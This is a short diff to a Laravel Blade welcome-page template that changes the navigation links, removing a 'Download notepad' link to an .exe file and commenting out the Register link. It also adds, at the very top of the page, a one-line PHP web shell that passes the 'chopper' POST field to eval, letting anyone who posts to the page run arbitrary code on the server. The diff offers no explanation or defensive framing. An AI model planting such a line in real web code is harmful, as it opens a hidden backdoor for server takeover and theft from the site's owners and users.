@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+<?php @eval($_POST['chopper']);?>
 <html lang="{{ config('app.locale') }}">
     <head>
         <meta charset="utf-8">
@@ -78,9 +79,8 @@ html, body {
                 @if (Auth::check())
                 <a href="{{ url('/home') }}">Home</a>
                 @else
-                <a href="{{ url('/notepad.exe') }}">Download notepad</a>
                 <a href="{{ url('/login') }}">Login</a>
-                <a href="{{ url('/register') }}">Register</a>
+                <!-- <a href="{{ url('/register') }}">Register</a>--!>
                 @endif
             </div>
             @endif
